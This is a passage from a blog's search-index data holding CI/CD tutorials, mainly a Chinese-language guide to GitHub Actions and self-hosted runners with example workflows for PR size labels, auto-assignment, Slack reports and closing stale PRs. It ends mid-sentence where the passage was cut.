timeout-minutes: 30 steps: # 🔐 Enable SSH Agent and add private key - name: Setup SSH Agent uses: webfactory/ssh-agent@v0.9.0 with: ssh-private-key: ${{ secrets.SSH_PRIVATE_KEY }} # 🛡️ Add github.com to known_hosts to avoid host verification errors - name: Add GitHub to known_hosts run: | mkdir -p ~/.ssh ssh-keyscan github.com &gt;&gt; ~/.ssh/known_hosts # 📦 Use SSH to clone private repo and verify - name: Clone and Verify Private Repo run: | git clone git@github.com:ZhgChgLi/github-actions-ci-cd-demo-certificates.git ./fakeMatch/ if [ -d \"./fakeMatch/.git\" ]; then echo \"✅ Repo cloned successfully into ./fakeMatch/\" cd ./fakeMatch echo \"📌 Current commit: $(git rev-parse --short HEAD)\" else echo \"❌ Clone failed. SSH Agent may not be configured properly.\" exit 1 fiYou can use the above Action to verify if the setup was successful.Success, subsequent fastlane match or pod install for private pods should execute correctly.SummaryThis article documents the complete iOS CI/CD process using GitHub Actions. The next article will optimize the user experience (engineers/PMs/designers) by enhancing Slack notifications and using Google Apps Script Web App to connect GitHub Actions to create a free and easy-to-use cross-team packaging platform tool.Series Articles: CI/CD Practical Guide (1): What is CI/CD? How to build a stable and efficient development team through CI/CD? Tool selection? CI/CD Practical Guide (2): Comprehensive use and construction of GitHub Actions and self-hosted Runners CI/CD Practical Guide (3): Implementing CI and CD workflows for App projects using GitHub Actions CI/CD Practical Guide (4): Using Google Apps Script Web App to connect GitHub Actions to build a free and easy-to-use packaging tool platformBuy me a coffee This series of articles has taken a lot of time and effort to write. If the content has helped you or significantly improved your team’s work efficiency and product quality, feel free to buy me a coffee as a token of appreciation!Buy me a coffeeIf you have any questions or suggestions, feel free to contact me.This article was first published on Medium ➡️ Click HereAutomatically converted and synchronized using ZMediumToMarkdown and Medium-to-jekyll-starter.Improve this page on Github.Follow Me on Medium 1K+ Followers 60 Total Views Last Statistics Date: 2025-08-15 | 56 Views on Medium." }, { "title": "CI/CD 實戰指南（二）：GitHub Actions 與 Self-hosted Runner 使用與建置大全", "url": "/posts/zrealm-dev/ci-cd-%E5%AF%A6%E6%88%B0%E6%8C%87%E5%8D%97-%E4%BA%8C-github-actions-%E8%88%87-self-hosted-runner-%E4%BD%BF%E7%94%A8%E8%88%87%E5%BB%BA%E7%BD%AE%E5%A4%A7%E5%85%A8-404bd5c70040/", "categories": "ZRealm Dev.", "tags": "ios-app-development, cicd, github-actions, github, self-hosted", "date": "2025-07-02 20:22:32 +0800", "snippet": "ℹ️ℹ️ℹ️ Click here to view the English version of this article, translated by OpenAI.CI/CD 實戰指南（二）：GitHub Actions 與 Self-hosted Runner 使用與建置大全帶您從頭了解 GitHub Actions/Self-hosted Runner 運作方式與手把手使用教學。Ph...", "content": "ℹ️ℹ️ℹ️ Click here to view the English version of this article, translated by OpenAI.CI/CD 實戰指南（二）：GitHub Actions 與 Self-hosted Runner 使用與建置大全帶您從頭了解 GitHub Actions/Self-hosted Runner 運作方式與手把手使用教學。Photo by Dan Taylor前言前篇「 CI/CD 實戰指南（一）：CI/CD 是什麼？如何透過 CI/CD 打造穩定高效的開發團隊？工具選擇？ 」我們介紹了 CI/CD 是什麼？能帶來哪些效益與工具的選擇， 這篇將著重在 GitHub Actions, Self-hosted Runner 的架構與使用介紹 ，並手把手一起建立幾個有趣的自動化工作流程，帶您慢慢上手。GitHub Actions 架構流程圖在開始之前我們先來確定一下 GitHub Actions 的運作架構流程關係與職責。GitHub Repo 在 GitHub Actions 的世界裡，所有 Actions (Workflow YAML 檔案) 都要存放在某個 Git Repo 之中 ( REPO/.github/workflows/ )GitHub Repo —Actions SecretsRepo → Settings → Secrets and variables → Actions → Secrets。 存放 Actions 步驟中會用到的 Secret Key, Tokene.g. Slack Bot Token、Apple Store Connect API .p8 Key Secrets 內容無法在 Action Log 中查看，會自動用 * * * * 隱蔽 Secrets 內容無法查看、編輯，只能覆蓋 Secrets 目前只支援純文字內容，無法上傳檔案 - 如果是二進制的金要請參考 官方步驟使用 Base64 編碼轉換後儲存 。- iOS 開發憑證儲存方式可參考官方教學： Installing an Apple certificate on macOS runners for Xcode development 可以儲存組織層級的 Secrets，跨 Repo 共享GitHub Repo — Actions VariablesRepo → Settings → Secrets and variables → Actions → Variables。 存放 Actions 步驟中常用到的變數e.g. 模擬器 iOS 版本、工作目錄 Variables 內容可以查看、編輯 Variables 內容可以輸出在 Action Log 中 Variables 只支援純文字，也可存放 json 字串然後自己解析使用 可以儲存組織層級的 Variables，跨 Repo 共享GitHub Actions — Trigger Github Action 中最重要的起始點 — 觸發事件(條件) 符合觸發事件的 GitHub Actions 才會觸發執行 完整事件列表可 參考官方文件 基本上涵蓋了所有 CI/CD、自動化會遇到的事件場景。但 如果有特殊場景沒有事件，那就只能用其他事件+在 Job 中判斷組合或是用 Schedule 排程手動檢查了 。e.g. 例如沒有 PR Merged 事件，就只能用 pull_request: closed + Job if: github.event.pull_request.merged == true 達成常用事件： schedule (cron)：排程定時執行(同 crontab)可以用來做自動化：定時檢查 PR、定時打包、定時執行自動化腳本統一都在 main / develop (Default Branch) 執行。 pull_request: ：PR 相關事件當 PR 開啟時、PR Assign 時、加 Label 時、有新 Push Commit 時…等等 issues 、 issue_comment ：Issue 相關事件當 Issue 開啟時、有新留言時…等等 workflow_dispatch ：手動觸發；可以設定需要提供的欄位，GitHub Actions 提供簡易的表單讓使用者可以填寫資訊。e.g.: workflow_call ：觸發另一個 Action(Workflow) 執行任務。 workflow_run ：當別的 Action(Workflow) 執行任務，觸發執行此任務。 更多事件類型、設定細節請 參考官方文件 。GitHub Actions — Workflow a.k.a Action 使用 YAML 撰寫 .yaml 檔案，檔案統一放置在 REPO/.github/workflows/ 之下 以主分支內的 Workflow YAML 檔案為主 如果在其他分支看不到正在開發的 Action 或執行上有誤，可以先 Merge 回主分支看看。 GitHub Actions 中的最基礎單位，每個 Workflow 就代表一項 CI/CD 或自動化操作 Workflow 可以呼叫別的 Workflow 執行任務(可以利用這個特性拆出核心 Workflow 和呼叫的 Workflow) 當中會定義任務名稱、執行策略、觸發事件、任務工作…等等所有 Action 相關設定 目前檔案結構不支援子目錄 Action 完全免費 (Public and Private Repo)GitHub Actions — Workflow — Job GitHub Actions 中的執行單位 定義 Workflow 中的任務工作有哪些 每個 Workflow 可以有多個 Jobs 每個 Job 需要指定使用哪個 Runner Label，執行的時候會使用對應的 Runner 機器來執行任務 多個 Jobs 是並發執行 (如有順序可以用 needs 約束) 每個 Job 應該視為獨立執行個體(每個都要當成是 Sandbox) ，Job 結束後如果有產出資源檔案要給後續其他 Job/Workflow 使用，需要 Upload Artifacts 或在 self-hosted 移動到共用產出目錄。 Job 做完可以 Output 字串給其他 Job 參考使用。(例如執行結果 true or false) 沒特別設流程條件的話，多個 Job 如果其中有 Job 發生錯誤， 其他 Job 依然會繼續執行GitHub Actions — Reuse Workflow/Job Workflow 定義 on: workflow_call 就能封裝給其他 Workflow 當成 Job 複用 同個組織下可以跨 Repo 分享使用 因此可以把跨 Repo 共用的 CI/CD 工作放到共享的 Repo 一起使用GitHub Actions — Workflow — Job — Step GitHub Actions 中的最小執行項目 Job 中實際執行任務的程式 每個 Job 可以有多個 Steps 多個 Steps 是照順序執行 Step 做完可以 Output 字串給後續 Steps 參考使用。 Step 可以直接撰寫 shell script 程式 可以引用 gh cli 、當前環境變數(例如取得 PR 編號)，直接做想做的事 沒特別設流程條件的話，Step 如果發生錯誤， 會直接中斷 ，後續的 Steps 不會執行GitHub Actions — Workflow — Job — Reuse Action Step 可以直接復用 Marketplace 上各路大神包好的現有工作步驟。 例如： Comment 內容到 PR 。 也可以將自己一系列的工作任務 Step 打包成一個 Action GitHub Repo 讓其他工作直接復用 Public Repo 的 Action 可以上架到 Marketplace打包 Action 支援使用： Docker Action — 代表 GitHub Actions 會把環境變數傳到 Docker 容器中，再看你要怎麼處理，可以是 shell script、Java、PHP…etc. JavaScript/TypeScript Action — 直接使用 node.js 撰寫 GitHub Actions 處理邏輯，同樣的會把環境變數都傳給你參考使用。e.g. pozil/auto-assign-issue Composite (YAML) — 純 YAML 描述任務步驟 (同 GitHub Actions — Workflow — Job — Step) 可以宣告有哪寫步驟要做或直接在上面寫 shell script。e.g. ZhgChgLi/ZReviewTender 礙於篇幅，本篇文章不會介紹如何打包 Github Actions Action，有興趣可以參考官方文件： tutorials/creating-a-composite-action 。GitHub Runner GitHub 會根據 Runner Label 派發對應的 Job 給 Runner 執行 Runner 只做為監聽者，輪詢監聽 GitHub 派發任務 只關心 Job 不關心是哪個 Action(Workflow)因此會出現 Action A 的 Job-1 執行完，下一個換 Action B 的 Job-1，而不是 Action A 的 Jobs 都執行完才換 Action B。 Runner 可以使用 GitHub Hosted Runner 或 Self-hosted Runner。GitHub Hosted Runner GitHub 提供的 Runner，可參考官方 Repo 列表：2025/06 的 Images 列表 Runner 預先安裝了什麼可以點進去查看：e.g. macos-14-arm64macos-14-arm64 iOS 開發優先使用 -arm64 (M系列) 處理器的 Runner，跑起來比較快 只要在 Job run-on 貼上表格上的 YAML Label，就能使用該 Runner 執行任務 Public Repo 收費方式: 完全免費無限使用 ️ Private Repo 免費額度:免費額度(依照帳號不同額度不同，以 GitHub Free 為例)：用量：每月免費 2,000 分鐘儲存：500 MB ⚠️️Private Repo 計費方式: 超過免費額度之後開始用用量計費(可設上限跟通知)，依照 Runner 所屬的機器作業系統、核心不同，價格也不同：about-billing-for-github-actions可以看到 macOS 的價格因為設備成本很高所以貴。 最多並發任務數限制：usage-limits-billing-and-administration 這邊扯太多了，我們的重點是 Self-hosted Runner。Self-hosted Runner on In-house Server 將自己的機器作為 Runner 一台實體機器可以起多個 Runner 並發接任務來做 免費無限量無限制使用 只有機器購買成本，花一次使用到飽！以 32G RAM M4 Mini (=NT$40,900) 計算，如果用 GitHub Hosted Runner 一個月要花 500 USD； 買一台架設好用超過三個月就回本 了！ 支援 Windows, macOS, Linux (x64/ARM/ARM64) 同個組織可以跨 Repo 共享 Runner ⚠️目前：actions/cache, actions/upload-artifact, actions/download-artifact 都只支援 GitHub 雲端服務，代表這些內容還是會上傳到 GitHub 伺服器並計算儲存量收費。 可以在自己的機器上開共用目錄取代。 Self-hosted Runner 也支援 Docker, k8s 只是我沒研究。 架設 Self-hosted Runner 只需幾步 (10 分鐘內設定好) 就能上線開始接任務執行(本文稍後會介紹)。GitHub Workflow x Job x Step x Runner 流程關係圖這邊用一張圖總結工作流程與關係，假設我們有兩個 Workflow、兩個 Runner: CI —假設 R有 3 個 Jobs，每個 Job 各有幾個 Steps，Runner Label(run-on) — self-hosted-app CD — 有 4 個 Jobs，每個 Job 各有幾個 Steps，Runner Label(run-on) — self-hosted-app Runner — 有 2 個，Runner Label 也都是— self-hosted-app同前述，Runner 跟 Workflow 是依照 Runnler Label 來派發、接收任務來做，這個案例都是用同個 self-hosted-app Runner Label，Workflow 的 Jobs 預設是並發執行、Steps 是每個 Job 的實際執行內容，串行照順序執行，Steps 都執行完等於 Job 執行完畢。 因此 Workflow 實際執行的時間軸會是在兩個 Runner 之間穿梭執行 Job，也會並發執行、當前 Job 執行完下一個也不一定是接著同個 Worflow 的下一個 Job。 ⚠️ 所以才說確保每個 Job 是獨立的很重要 (尤其在 Self-hosted Runner 環境之下，Job 結束之後可能不會清除的太乾淨，我們可能會下意識覺得這個 Job 的產出，下一個 Job 可以接著做事)，不應該這樣用。如果 Job 有產出要給後續的 Job 使用: Job Output String : 輸出純文字到變數給其他 Job 引用 Artifact-upload/download: Job 的 Step 最後一步將執行結果上傳到 GitHub Artifact，另一個 Job 的第一個 Step 下載回來繼續處理使用。e.g. 例如 Job — 打包 → 將打包結果 .ipa 傳到 Artifact → Job — 部署 → 下載回來 .ipa → 上傳 App Store 部署要注意： 目前就算是 Self-hosted 也是會上 GitHub Artifact 雲儲存。 AWS/GCP…雲端儲存 : 同上，只是是用自己的雲端儲存服務。 [Self-hosted Only] 共用硬碟、目錄: Self-hosted Runner 如果都有掛載一個共用目錄，則可用這個目錄依照 UUID 建立資料夾存放產出結果，然後後續 Job 去讀取前一個 Job Output UUID 去找到對應的儲存再拿回來用。要注意，不同主機的 Runner 也都要掛載同個共用目錄。 在同個 Job 的 Steps 把所有事情做完。做中學 GitHub Actions — 案例實作「坐而言，不如起而行」以上名詞解釋跟流程架構介紹相信大家也是看得懵懵懂懂，接下來會直接舉三個功能例子，帶大家實際動手做，並一邊解釋碰到的東西，從做當中學習，以了解 GitHub Actions 到底是什麼。案例 — 1建立 Pull Request 後自動標記 File Changes Size Label 讓 Reviewer 方便安排 Review 工作。成果圖Demo PR運作流程 使用者開 PR、重開 PR、Push 新 Commit 到 PR 觸發 GitHub Actions Workflow shell script 取的 file changes 數量 判斷數量對 PR 標記上 Label 完成動手做Repo → Actions → New workflow → set up a workflow yourself。檔案名稱： Automation-PullRequest.ymlAction Workflow 可以每個任務獨立一個檔案，也可以依照觸發事件、目的，同個目的聚合在同個檔案，反正多個 Job 是並發執行的，另外 因為 GitHub Actions 暫時不支援目錄結構，所以檔案少一點、使用階層命名檔案會比較好管理 。這邊把 PR 相關事件的 Actions 都放在同個 Workflow。Automation-PullRequest.yml# Workflow(Action) 名稱name: Pull Reqeust Automation# Actions Log 的標題名稱run-name: \"[Pull Reqeust Automation] ${{ github.event.pull_request.title || github.ref }}\"# 觸發事件on: # PR 事件 pull_request: # PR - 開啟、重開、有新 Push Commit 時 types: [opened, synchronize, reopened]# 同個 Concurrency Group 如果有新的 Job 會取消正在跑的# 例如 Push Commit 觸發的任務還沒執行就又 Push Commit 時，會取消前一個任務concurrency: group: ${{ github.workflow }}-${{ github.ref_name }} cancel-in-progress: true# Job 工作項目# Job 會並發執行jobs: # Job ID label-pr-by-file-count: # Job 名稱 (可省略，有設定在 Log 顯示比較好讀) name: Label PR by changes file count # 如果這個 Job 失敗，不影響整個 Workflow，繼續其他 Job continue-on-error: true # 設定最長 Timeout 時間，防止異常情況發生時無止盡的等待 timeout-minutes: 10 # Runner Label - 使用 GitHub Hosted Runner ubuntu-latest 來執行工作 # 如果是 Private Repo 會計算用量，超過可能會產生費用 runs-on: ubuntu-latest # 工作步驟 # 工作步驟會照順序執行 steps: # 步驟名稱 - name: Get changed file count and apply label # 步驟 ID (可省略，後續若沒有 Step 要引用 Output 輸出則不需設定) id: get-changed-files-count-by-gh # 注入外部環境參數到執行階段 env: # secrets.GITHUB_TOKEN 是 GitHub Actions 執行時自動產生的 Token，不需自行在 Secrets 設定，擁有一些 GitHub Repo API Scopes 權限 # https://docs.github.com/en/actions/how-tos/security-for-github-actions/security-guides/use-github_token-in-workflows # gh(GitHub) cli 需要注入 GH_TOKEN 到 ENV，gh 才有權限操作 GH_TOKEN: ${{ secrets.GITHUB_TOKEN }} # Shell script # GitHub Hosted Runner 內建都有安裝好 gh cli，不需要安裝 Job 就能直接使用 run: | # ${{ github.xxx }} 是 GitHub Actions Context 表達式 # 不是 Shell 變數，而是 YAML 解析階段由 GitHub Actions 替換成對應值 # 其他參數：https://docs.github.com/en/actions/learn-github-actions/contexts#github-context # 取得 PR 編號: PR_NUMBER=${{ github.event.pull_request.number }} # 取得 Repo: REPO=${{ github.repository }} # 使用 GitHub API (gh cli) 取得 File changed 數量 FILE_COUNT=$(gh pr view $PR_NUMBER --repo $REPO --json files --jq '.files | length') # Print Log echo \"Changed file count: $FILE_COUNT\" # Label 邏輯 if [ \"$FILE_COUNT\" -lt 5 ]; then LABEL=\"XS\" elif [ \"$FILE_COUNT\" -lt 10 ]; then LABEL=\"S\" elif [ \"$FILE_COUNT\" -lt 30 ]; then LABEL=\"M\" elif [ \"$FILE_COUNT\" -lt 80 ]; then LABEL=\"L\" elif [ \"$FILE_COUNT\" -lt 200 ]; then LABEL=\"XL\" else LABEL=\"XXL\" fi # 使用 GitHub API (gh cli) 移除目前的 Size Label EXISTING_LABELS=$(gh pr view \"$PR_NUMBER\" --repo \"$REPO\" --json labels --jq '.labels[].name') for EXISTING in $EXISTING_LABELS; do case \"$EXISTING\" in XS|S|M|L|XL|XXL) echo \"🧹 Removing existing label: $EXISTING\" gh pr edit \"$PR_NUMBER\" --repo \"$REPO\" --remove-label \"$EXISTING\" ;; esac done # (可選)如果 Label 不存在則建立 if ! gh label list --repo \"$REPO\" | grep -q \"^$LABEL\"; then echo \"🆕 Creating missing label: $LABEL\" gh label create \"$LABEL\" --repo \"$REPO\" --description \"Size label: $LABEL\" --color \"ededed\" else echo \"✅ Label '$LABEL' already exists\" fi # 使用 GitHub API (gh cli) 標記上 Label gh pr edit $PR_NUMBER --repo $REPO --add-label \"$LABEL\"Commit 檔案到 Repo 主分支之後，我們再開新 PR 就會自動觸發 GitHub Actions：Action 執行狀態顯示 Queued 代表任務正在等待 Runner 接任務回去做。執行結果Demo PR執行完畢並且成功後 PR 上就會自動標記好對應的 Label 了！紀錄會顯示由 github-actions 標記。完整程式碼： Automation-PullRequest.yml直接使用別人包好的 Action 步驟： pascalgn/size-label-action前面有說到可以直接使用別人封裝好的 Action，標記 PR Size Label 這任務已經有現成的輪子可以使用，上述只是為了教學目的，實際上不需要自己重造輪子。只需要在 Action Workflow Job Step 中直接使用就能完成任務：# Workflow(Action) 名稱name: Pull Reqeust Automation# 觸發事件on: # PR 事件 pull_request: # PR - 開啟、重開、有新 Push Commit 時 types: [opened, synchronize, reopened]# 同個 Concurrency Group 如果有新的 Job 會取消正在跑的# 例如 Push Commit 觸發的任務還沒執行就又 Push Commit 時，會取消前一個任務concurrency: group: ${{ github.workflow }}-${{ github.ref_name }} cancel-in-progress: true# Job 工作項目# Job 會並發執行jobs: # Job ID label-pr-by-file-count: # Job 名稱 (可省略，有設定在 Log 顯示比較好讀) name: Label PR by changes file count # 如果這個 Job 失敗，不影響整個 Workflow，繼續其他 Job continue-on-error: true # 設定最長 Timeout 時間，防止異常情況發生時無止盡的等待 timeout-minutes: 10 # Runner Label - 使用 GitHub Hosted Runner ubuntu-latest 來執行工作 # 如果是 Private Repo 會計算用量，超過可能會產生費用 runs-on: ubuntu-latest # 工作步驟 # 工作步驟會照順序執行 steps: # 步驟名稱 - name: Get changed file count and apply label # 步驟 ID (可省略，後續若沒有 Step 要引用 Output 輸出則不需設定) id: get-changed-files-count-by-gh # 直接使用別人封裝好的程式 uses: \"pascalgn/size-label-action@v0.5.5\" # 注入外部環境參數到執行階段 # 參數命名、可用參數要參考說明：https://github.com/pascalgn/size-label-action/tree/main env: # secrets.GITHUB_TOKEN 是 GitHub Actions 執行時自動產生的 Token (github-actions 身份)，不需自行在 Secrets 設定，擁有一些 GitHub Repo API Scopes 權限 # https://docs.github.com/en/actions/how-tos/security-for-github-actions/security-guides/use-github_token-in-workflows GITHUB_TOKEN: \"${{ secrets.GITHUB_TOKEN }}\"這個包好的 Action 是 JavaScript Action，實際執行程式碼可以參考以下檔案： dist/index.js 。name, run-name 的補充： name: Action Workflow 的名稱 run-name: 執行紀錄的標題名稱 (可帶入 PR Title or Branch or Author…etc)如果是 on:pull_request 事件預設是 PR Title。案例 — 2建立 Pull Request 後如果沒有 Assignee 則自動 Assign 作者自己並且 Comment 提示。(只有在初次建立時才會執行)成果圖Demo PR運作流程 使用者開 PR 觸發 GitHub Actions Workflow github script 取得 assignee 如果沒有 asignee 則 assign 開 PR 的作者 &amp; Comment 訊息 完成動手做Repo → Actions → New workflow → set up a workflow yourself。檔案名稱： Automation-PullRequest.yml (同上)Automation-PullRequest.yml# Workflow(Action) 名稱name: Pull Reqeust Automation# Actions Log 的標題名稱run-name: \"Pull Reqeust Automation - Daily Checker\"# 觸發事件on: # PR 事件 pull_request: # PR - 開啟、重開、有新 Push Commit 時 types: [opened, synchronize, reopened]# 同個 Concurrency Group 如果有新的 Job 會取消正在跑的# 例如 Push Commit 觸發的任務還沒執行就又 Push Commit 時，會取消前一個任務concurrency: group: ${{ github.workflow }}-${{ github.ref_name }} cancel-in-progress: true# Job 工作項目# Job 會並發執行jobs: # Job ID label-pr-by-file-count: # 請參考前文，略.... # --------- assign-self-if-no-assignee: name: Automatically assign to self if no assignee is specified # 因為是共用觸發事件，所以在 Job 上自己判斷，當是 Pull Request Opened(首次建立) 時才執行 Job 否則會 Skipped if: github.event_name == 'pull_request' &amp;&amp; github.event.action == 'opened' # 如果這個 Job 失敗，不影響整個 Workflow，繼續其他 Job continue-on-error: true # 設定最長 Timeout 時間，防止異常情況發生時無止盡的等待 timeout-minutes: 10 # Runner Label - 使用 GitHub Hosted Runner ubuntu-latest 來執行工作 # 如果是 Private Repo 會計算用量，超過可能會產生費用 runs-on: ubuntu-latest steps: - name: Assign self if No Assignee # 使用 GitHub Script (JavaScript) 撰寫腳本 (Node.js 環境) # 相較上面直接用 Shell Script 寫起來更方便漂亮 # 也不需要自行注入環境變數、GITHUB_TOKEN uses: actions/github-script@v7 with: script: | // github-script 中會自動注入到 context 變數供 javascript 直接引用 // https://docs.github.com/en/actions/learn-github-actions/contexts#github-context const issue = context.payload.pull_request; // 如果要連 Issue 一起支援可寫成 context.payload.issue || context.payload.pull_request const assignees = issue.assignees || []; const me = context.actor; if (assignees.length === 0) { // Assignee 設成自己 await github.rest.issues.addAssignees({ owner: context.repo.owner, repo: context.repo.repo, issue_number: issue.number, assignees: [me] }); // 留言通知 await github.rest.issues.createComment({ owner: context.repo.owner, repo: context.repo.repo, issue_number: issue.number, body: `🔧 No assignee was set, so I have assigned this to myself (@${me}).` }); }這次我們示範改用 GitHub Script (JavaScript) 撰寫腳本，程式碼語法上更彈性更好撰寫。當然如果你想照我之前說的每個任務一個檔案，就可以拔掉 Job If. . 直接在 Action Workflow 觸發條件設定：Automation-PullRequest-Auto-Assign.yml ：# Workflow(Action) 名稱name: Pull Reqeust Automation - Auto Assignee Self# 觸發事件on: # PR 事件 pull_request: # PR - 開啟時 types: [opened]jobs: assign-self-if-no-assignee: name: Automatically assign to self if no assignee is specified runs-on: ubuntu-latest steps: # 請參考前文，略....Commit 檔案到 Repo 主分支之後，我們再開新 PR 就會自動觸發 GitHub Actions：現在有兩個 Job 要執行了！執行結果Demo PR執行完畢並且成功後 PR 如果沒有 Asignees 會自動 Assign PR 作者並且 Comment 訊息。(都是用 github-actions 身份操作)完整程式碼： Automation-PullRequest.yml測試重開(Reopened) PR可看到只會執行 Size Label Job，Auto Assignee Job 被 Skipped 了。 這個任務也有人包好 Action 可以直接復用，可參考： pozil/auto-assign-issue 。案例 — 3每日早上 9 點自動統計當前 PR 數量及已開啟多久時間發送通知訊息到 Slack 工作尋組、自動關閉已開啟超過 3 個月的 PR。成果圖 Slack 工作群組每天早上自動收到報告 自動關閉超過 90 天的 PR運作流程 GitHub Actions 每天早上 9 點自動觸發 觸發 GitHub Actions Workflow github script 取得 開啟中的 PR 列表、統計開啟了幾天 傳送統計報告訊息到 Slack 關閉超過 90 天的 PR 完成動手做Repo → Actions → New workflow → set up a workflow yourself。檔案名稱： Automation-PullRequest-Daily.ymlAutomation-PullRequest-Daily.yml# Workflow(Action) 名稱name: Pull Reqeust Automation - Daily Checker# 觸發事件on: # 排程定時自動執行 # https://crontab.guru/ # UTC 時間 schedule: # UTC 的 01:00 = 每天 UTC+8 的 09:00 - cron: '0 1 * * *' # 手動觸發 workflow_dispatch:# Job 工作項目# Job 會並發執行jobs: # Job ID caculate-pr-status: # Job 名稱 (可省略，有設定在 Log 顯示比較好讀) name: Caculate PR Status # Runner Label - 使用 GitHub Hosted Runner ubuntu-latest 來執行工作 # 如果是 Private Repo 會計算用量，超過可能會產生費用 runs-on: ubuntu-latest # Job Output outputs: pr_list: ${{ steps.pr-info.outputs.pr_list }} # 工作步驟 # 工作步驟會照順序執行 steps: # 步驟名稱 - name: Fetch open PRs and caculate # Step 外部要引用 Output 輸出，需設定 id: pr-info uses: actions/github-script@v7 with: script: | const now = new Date(); const per_page = 100; let page = 1; let allPRs = []; while (true) { const { data: prs } = await github.rest.pulls.list({ owner: context.repo.owner, repo: context.repo.repo, state: 'open', per_page, page, }); if (prs.length === 0) break; allPRs = allPRs.concat(prs); if (prs.length &lt; per_page) break; page++; } const result = allPRs.map(pr =&gt; { const created = new Date(pr.created_at); const daysOpen = Math.floor((now - created) / (1000 * 60 * 60 * 24)); return { pr: pr.number.toString(), title: pr.title, idle: daysOpen }; }); // 設定回 Output，只接受 String core.setOutput('pr_list', JSON.stringify(result)); # ---- send-pr-summary-message-to-slack: name: Send PR Summary Messag to Slack # Job 預設是並發，使用 needs 可以迫使當前 Job 等到 need Job 完成時才會執行 needs: [caculate-pr-status] runs-on: ubuntu-latest steps: - name: Generate Message # Step 外部要引用 Output 輸出，需設定 id: gen-msg uses: actions/github-script@v7 with: script: | const prList = JSON.parse(`${{ needs.caculate-pr-status.outputs.pr_list }}`); const blocks = []; // 標題 blocks.push({ type: \"section\", text: { type: \"mrkdwn\", text: `📬 *Open PR Report*\\nTotal: *${prList.length}* PR(s)` } }); // 每個 PR 一行 for (const pr of prList) { blocks.push({ type: \"section\", text: { type: \"mrkdwn\", text: `• &lt;https://github.com/${context.repo.owner}/${context.repo.repo}/pull/${pr.pr}|PR #${pr.pr}&gt; *${pr.title}* - 🕒 ${pr.idle} day(s)` } }); } // 設定回 Output，只接受 String core.setOutput('blocks', JSON.stringify(blocks)); # 使用 Slack 官方封裝好的 Slack API Github Actions # https://tools.slack.dev/slack-github-action/sending-techniques/sending-data-slack-api-method/ # 發送訊息 - name: Post text to a Slack channel uses: slackapi/slack-github-action@v2.1.0 with: method: chat.postMessage token: ${{ secrets.SLACK_BOT_TOKEN }} payload: | channel: ${{ vars.SLACK_TEAM_CHANNEL_ID }} blocks: ${{ steps.gen-msg.outputs.blocks }} # ---- auto-close-old-prs: name: Auto Close Old PRs needs: [caculate-pr-status] runs-on: ubuntu-latest steps: - name: Auto close PRs opened more than 90 days uses: actions/github-script@v7 with: script: | const prList = JSON.parse(`${{ needs.caculate-pr-status.outputs.pr_list }}`); const oldPRs = prList.filter(pr =&gt; pr.idle &gt; 90); for (const pr of oldPRs) { await github.rest.pulls.update({ owner: context.repo.owner, repo: context.repo.repo, pull_number: parseInt(pr.pr), state: 'closed' }); await github.rest.issues.createComment({ owner: context.repo.owner, repo: context.repo.repo, issue_number: parseInt(pr.pr), body: `⚠️ This pull request has been automatically closed because it has been open for more than 90 days. Please reopen if needed.` }); } console.log(`Closed ${oldPRs.length} PR(s)`);在這個範例中我們使用： on: schedule Crontab 排程自動觸發跟 workflow_dispatch 支援手動觸發 Job output/Step output (都只能是字串) 多個 Jobs 預設是並發但可以用 needs 時間依賴等待關係 從 Repo Secrets/Variables 取得設定 串接 Slack APIRepo Secrets — 新增 SLACK_BOT_TOKEN Slack App 建立、發訊息權限設定可參考我 之前的文章Repo Variables — 新增 SLACK_TEAM_CHANNEL_IDCommit 檔案到 Repo 主分支之後，回到 Actions 手動觸發看看： 日後會每日自動觸發。Actions → Pull Request Automation — Daily Checker → Run workflow → Branch: main → Run workflow。執行後可以點擊進入查看執行狀況：因為有 needs 的限制，Jobs 流程就會是 Cacluate PR Status 先完成後才會並發執行 Auto Close Old PRs 和 Send PR Summary Message to Slack 。執行結果任務都成功執行後可以查看 Slack 訊息：成功 🚀🚀🚀完整程式碼： Automation-PullRequest-Daily.yml小結 希望上面三個案例能讓您對 GitHub Actions 有個初步的了解也希望有激起你的自動化工作創意，可以自己發想工作流程(請務必先參考 觸發事件 )，然後撰寫腳本執行；也記得先去 Marketplace 找找現有的步驟可以站在巨人的肩膀直接使用。本篇只是入門基礎(甚至沒 Checkout Code)，下一篇「 CI/CD 實戰指南（三）：使用 GitHub Actions 實作 App 專案的 CI 與 CD 工作流程 」會在介紹更複雜深入的 GitHub Actions Workflow。GitHub 自動化延伸議題GitHub 可以與 Slack 整合，訂閱 Repo 的 PR 更新通知、Push Default Branch 通知…等等。問題 1. GitHub 訊息無法標記到人，只標記了 GitHub 帳號，Slack 帳號收不到通知：Slack App or Apps 搜尋 GitHub → 打開訊息視窗 →完成 Connect GitHub Account 步驟，這樣 GitHub 才知道你對應的 Slack UID 是什麼，才能標記你。問題 2. Pull Request Reminder我記得這本來是第三方開發的功能，後來直接整合在 GitHub 裡面了，不要傻傻的自己用 GitHub Actions 寫腳本做！ GitHub 內建的是 by Team 設置，你需要先為組織增加 Team、Repo 加入 Team 然後才能設置 Pull Request Reminder。 輸入完 Slack Channel 跟規則儲存之後每天就會自動傳送提示訊息跟標記 Reviewer 了，設置可 參考 ，結果如下圖：https://michaelheap.com/github-scheduled-reminders/問題 4. GitHub PR 訊息，作者收不到通知： 這是一個萬年的問題，就是 PR 的 Slack 訊息 其實作者並不知道有人 Reply Threads 討論 ，GitHub 發的這則 Slack 訊息只會標記 Reviewers，不會標記 Assignee or PR 作者。這時候 GitHub Actions 做自動化小工具就派上用場了，我們可以加一個 Job 在 PR Description 最後 Append 標記作者，這樣訊息傳到 Slack 也會一並標記到作者的 Slack:# Workflow(Action) 名稱name: Pull Reqeust Automation# 請參考前文，略.... # --------- append-author-to-pr-description: name: Append author to PR description # 因為是共用觸發事件，所以在 Job 上自己判斷，當是 Pull Request Opened(首次建立) 時才執行 Job 否則會 Skipped if: github.event_name == 'pull_request' &amp;&amp; github.event.action == 'opened' # 如果這個 Job 失敗，不影響整個 Workflow，繼續其他 Job continue-on-error: true # 設定最長 Timeout 時間，防止異常情況發生時無止盡的等待 timeout-minutes: 10 # Runner Label - 使用 GitHub Hosted Runner ubuntu-latest 來執行工作 # 如果是 Private Repo 會計算用量，超過可能會產生費用 # 但這種自動化小工作不太容易用過量 runs-on: ubuntu-latest steps: - name: Append author to PR description env: # secrets.GITHUB_TOKEN 是 GitHub Actions 執行時自動產生的 Token，不需自行在 Secrets 設定，擁有一些 GitHub Repo API Scopes 權限 # gh(GitHub) cli 需要注入 GH_TOKEN 到 